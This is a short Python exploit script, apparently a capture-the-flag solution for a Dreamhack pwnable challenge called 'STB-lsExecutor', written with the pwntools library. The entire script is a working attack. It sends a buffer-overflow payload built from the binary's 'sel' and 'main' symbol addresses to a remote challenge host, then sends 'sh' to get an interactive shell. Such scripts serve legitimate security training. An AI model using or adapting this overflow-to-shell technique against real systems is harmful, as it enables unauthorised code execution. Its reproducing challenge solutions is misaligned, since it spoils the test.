from pwn import *

port = 14460
rem = remote("host1.dreamhack.games", port)

elf = ELF("./Pwnable/STB-lsExecutor/problem/stb-lsExecutor")

main_addr = elf.symbols['main']
sel_addr = elf.symbols['sel']

rem.sendafter(b"option : ", b"A" * 60)

payload = b"B" * 0x2c
payload += p32(9)
payload += p64(sel_addr + 0x70)
payload += p64(main_addr + 164)
rem.sendafter(b"path : ", payload)

rem.sendafter(b"y/n\n", b"sh")

rem.interactive()